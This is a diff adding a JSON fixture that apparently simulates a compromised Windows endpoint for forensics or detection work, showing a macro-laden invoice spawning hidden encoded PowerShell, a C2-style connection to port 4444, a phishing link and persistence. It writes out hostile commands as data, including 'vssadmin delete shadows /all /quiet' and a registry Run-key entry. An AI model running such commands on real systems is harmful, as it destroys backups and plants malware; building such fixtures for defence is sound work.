@@ -1,0 +1,32 @@
+{
+  "version": 1,
+  "hostname": "win-ep-04",
+  "os": "Windows 11",
+  "processes": [
+    {
+      "pid": 812, "ppid": 640, "name": "explorer.exe", "user": "j.mensah", "cmd": "C:\\Windows\\explorer.exe",
+      "children": [
+        {
+          "pid": 4188, "ppid": 812, "name": "winword.exe", "user": "j.mensah", "cmd": "WINWORD.EXE /n \"Invoice_July.docm\"",
+          "children": [
+            {
+              "pid": 6624, "ppid": 4188, "name": "powershell.exe", "user": "svc-batch", "cmd": "powershell -nop -w hidden -enc SQBFAFgAKABJAFcAUgAg...",
+              "children": [
+                { "pid": 7710, "ppid": 6624, "name": "vssadmin.exe", "user": "svc-batch", "cmd": "vssadmin.exe delete shadows /all /quiet", "children": [] }
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "connections": [
+    { "proto": "TCP", "laddr": "10.0.0.5:51344", "raddr": "185.220.101.34:4444", "state": "ESTABLISHED", "pid": 6624 }
+  ],
+  "browserHistory": [
+    { "ts": "2026-07-01T14:26:58Z", "title": "Invoice payment portal", "url": "http://pay-invoice-verify.top/login" }
+  ],
+  "shellHistory": [
+    { "ts": "2026-07-01T14:30:58Z", "user": "svc-batch", "cmd": "reg add HKCU\\...\\Run /v Updater /d C:\\ProgramData\\svc.exe" }
+  ]
+}
